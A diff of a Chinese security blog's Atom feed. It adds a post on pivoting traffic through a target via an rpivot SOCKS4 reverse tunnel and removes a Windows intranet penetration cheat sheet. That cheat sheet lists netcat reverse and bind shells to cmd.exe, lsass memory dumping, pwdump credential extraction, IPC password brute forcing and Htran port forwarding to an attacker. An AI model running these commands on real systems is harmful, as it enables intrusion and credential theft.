@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.evilclay.com/"/>
-  <updated>2017-06-02T17:24:00.679Z</updated>
+  <updated>2017-06-11T14:20:02.465Z</updated>
   <id>http://www.evilclay.com/</id>
   
   <author>
@@ -14,6 +14,68 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SOCKS4反向代理实验</title>
+    <link href="http://www.evilclay.com/2017/06/11/SOCKS4%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E9%AA%8C/"/>
+    <id>http://www.evilclay.com/2017/06/11/SOCKS4反向代理实验/</id>
+    <published>2017-06-11T14:17:30.000Z</published>
+    <updated>2017-06-11T14:20:02.465Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SOCKS4 反向代理是 先在 服务器A （比如攻击机） 上运行 SOCKS4 代理的 服务端程序监听指定端口，然后 在客户机（比如靶机）上运行 客户端程序连接服务器的指定端口。</p>
+<p>这样就建立了一条 从 靶机 到攻击机的反向 SOCKS 隧道，攻击机的应用程序（比如 wget nmap curl …）使用该隧道后，程序的所有流量都会先经过靶机转发出去。</p>
+<p>接着大家说说相关名词的概念 :P</p>
+<p>SOCKS代理：是一种网络协议，主要用于客户端和服务器的中间通讯（并不是我们说的socket套接字）。SOCKS代理工作在比HTTP代理更低的层次，HTTP代理只是将HTTP请求转发到目标HTTP服务器。SOCKS代理可以转发UDP流量和反向代理，HTTP代理不能。</p>
+<p>SOCKS代理目前常用 SOCKS4 代理和 SOCKS5 代理两种版本，SOCKS4 只支持 TCP 代理， SOCK5 还支持 UDP代理， 验证 以及 IPv6. [1]</p>
+<p>proxychains： Linux下 强制应用程序 使用 Tor， SOCKS4/5代理， HTTP(S) 代理的一款工具。</p>
+<p>下面，以 GitHub 上的 <a href="https://github.com/artkond/rpivot" target="_blank" rel="external">https://github.com/artkond/rpivot</a> [2] 项目演示 使用 SOCKS4 反向代理。</p>
+<h2 id="服务器监听"><a href="#服务器监听" class="headerlink" title="服务器监听"></a>服务器监听</h2><p>下载  <a href="https://github.com/artkond/rpivot" target="_blank" rel="external">https://github.com/artkond/rpivot</a> 并解压。</p>
+<p>运行 server.py 监听本地外网9999端口：</p>
+<pre><code>python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
+</code></pre><h2 id="客户机连接"><a href="#客户机连接" class="headerlink" title="客户机连接"></a>客户机连接</h2><p>下载  <a href="https://github.com/artkond/rpivot" target="_blank" rel="external">https://github.com/artkond/rpivot</a> 并解压。</p>
+<p>运行 client.py 连接服务器的 9999 端口：</p>
+<pre><code>python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999
+</code></pre><h2 id="服务器使用代理"><a href="#服务器使用代理" class="headerlink" title="服务器使用代理"></a>服务器使用代理</h2><p>先下载 proxychains 工具：</p>
+<pre><code>apt get install proxychains
+</code></pre><p>修改配置文件，设置 SOCKS4 代理：</p>
+<pre><code>vim /etc/proxychains.conf 
+// 添加 socks4 代理
+[ProxyList]
+socks4 127.0.0.1 1080
+</code></pre><p>现在使用 curl 命令不使用 代理请求 ip.cn:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/socks4/socks4_no.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>对 curl 使用代理后访问 ip.cn:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/socks4/socks4_yes.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://zh.wikipedia.org/wiki/SOCKS" target="_blank" rel="external">https://zh.wikipedia.org/wiki/SOCKS</a></li>
+<li><a href="https://github.com/artkond/rpivot" target="_blank" rel="external">https://github.com/artkond/rpivot</a></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;SOCKS4 反向代理是 先在 服务器A （比如攻击机） 上运行 SOCKS4 代理的 服务端程序监听指定端口，然后 在客户机（比如靶机）上
+    
+    </summary>
+    
+    
+      <category term="反向代理" scheme="http://www.evilclay.com/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
+    
+      <category term="SOCKS4" scheme="http://www.evilclay.com/tags/SOCKS4/"/>
+    
+  </entry>
   
   <entry>
     <title>1.5W条密码样本分析</title>
@@ -1552,94 +1614,6 @@ netsh -c i i add neighbors 4 192.168.1.1 0c-72-2c-25-ca-66
     
     
       <category term="ARP欺骗" scheme="http://www.evilclay.com/tags/ARP%E6%AC%BA%E9%AA%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows内网渗透常用工具命令速记</title>
-    <link href="http://www.evilclay.com/2016/10/27/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4%E9%80%9F%E8%AE%B0/"/>
-    <id>http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/</id>
-    <published>2016-10-27T15:36:24.000Z</published>
-    <updated>2016-10-27T16:20:04.278Z</updated>
-    
-    <content type="html"><![CDATA[<p>建立 IPC 连接（需要139 or 445 端口）：</p>
-<pre><code>net use \\ip\ipc$ /user:username password
-net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
-net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
-copy c:\123.txt \\ip\C$\111\     // 把本地 123.txt 复制到对方 C 盘 111 目录下
-net view \\ip            // 显示远程主机的共享
-net share        // 查看本地已开启的共享
-net share ipc$  // 本机开启 IPC 服务
-</code></pre><p>AT 计划任务：</p>
-<pre><code>net time \\ip        // 查看 远程 IP 上的系统时间
-at \\ip 时间 程序名 or 系统命令
-</code></pre><p>PsExec :</p>
-<pre><code>PsExec \\&lt;ip&gt; -u user -p pass cmd
-</code></pre><p>PwDump:</p>
-<pre><code>pwdump7.exe (Dump system passwords)
-pwdump7.exe -s (Dump passwords from files)
-pwdump7.exe -d [sourcefile] [destionation] (Copy filename to destionation) // 可以复制进程调用的文件
-pwdump7.exe -h (Show this help)
-pwdump6.exe -x &lt;dst_ip&gt; // 需要与 dst_ip 建立 IPC 通道，而且是pwdump6版本有这个功能
-</code></pre><p>NC:</p>
-<pre><code>nc 192.168.1.1 5678　　连接.100的5678端口
-nc -vv -lp  22222 -t -e cmd.exe   监听本地22222端口并反弹CMD
-
-nc -vv -lp 23333 // 监听 本地23333端口
-nc 192.16.1.1 23333 -t -e cmd  // 连接远程23333端口并绑定 CMD
-</code></pre><p>GetPass:</p>
-<pre><code>//  闪电小子 根据 minikatz 编译的工具，分为32位和64位，可以直接过去明文密码。
-</code></pre><p>QuarksPwDump</p>
-<pre><code>// 支持 Windows XP / 2003 / Vista / 7 / 2008 / 8
-QuarksPwDump.exe -dhl  // 抓取本地 hash
-QuarksPwDump.exe -k   // 获得系统秘钥
-</code></pre><p>ProcDump：</p>
-<pre><code>// lsass.exe 是Windows安全策略，权威域认证，AD管理的关键组件
-procdump.exe -accepteula -ma lsass.exe lsass.dmp  // 下载内存文件到本地
-</code></pre><p>IPC批处理爆破：</p>
-<pre><code>ipc_crack.bat IP Username Passwordfile.txt
-</code></pre><p>hscan：</p>
-<pre><code>hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -ftp        //  使用FTP弱点模块探测
-hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -all        //  加载所有弱点模块探测
-</code></pre><p>ftpscan：</p>
-<pre><code>ftpscan.exe &lt;start_ip&gt;-&lt;end_ip&gt; 200            // 开启200线程扫描制定 IP 段
-                                            // 使用的是默认字典 username.dic password.dic
-</code></pre><p>Port2Port：</p>
-<pre><code>Port2Port.exe 2333 &lt;ip&gt; port                    // 把 本地 2333 端口转发到 远程 port
-</code></pre><p>铁鹰PortTransfer：</p>
-<pre><code>PortTransfer.exe -listen  &lt;本地 监听端口&gt;  &lt;本地 反弹端口&gt;
-PortTransfer.exe -remote &lt;远程 IP&gt; &lt;远程 端口&gt; 127.0.0.1 &lt;本地 监听端口&gt;
-</code></pre><p>Fpipe:</p>
-<pre><code>在跳板机上运行：fpipe -l 81 -r 22 &lt;远程IP&gt;
-//把 远程IP 的 22 端口映射到跳板机 81端口，默认使用高端口转发流量。
-
-或者：
-
-在跳板机上运行：fpipe -l 81 -s 82 -r 22 &lt;远程IP&gt;
-//把 远程IP 的 22 端口映射到跳板机 81端口，并且指定82端口来转发流量。
-</code></pre><p>Htran:</p>
-<pre><code>HTran2.4.exe -p -Listen 11111 22222
-// 攻击端 IP 执行
-// 开启 11111 22222 端口 并把 11111 的流量转发给 22222
-
-HTran2.4.exe -p -slave &lt;攻击端 IP&gt; 11111 127.0.0.1 3389
-// 被攻击端IP 执行
-// 把 本地 3389 端口转发到 攻击机 的 11111端口
-</code></pre><p>目前整理了这些工具，定会疏漏，欢迎大黑牛告诉小弟，我来补充下~</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;建立 IPC 连接（需要139 or 445 端口）：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net use \\ip\ipc$ /user:username password
-net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
-    
-    </summary>
-    
-    
-      <category term="内网渗透" scheme="http://www.evilclay.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="安全工具" scheme="http://www.evilclay.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
     
   </entry>
   
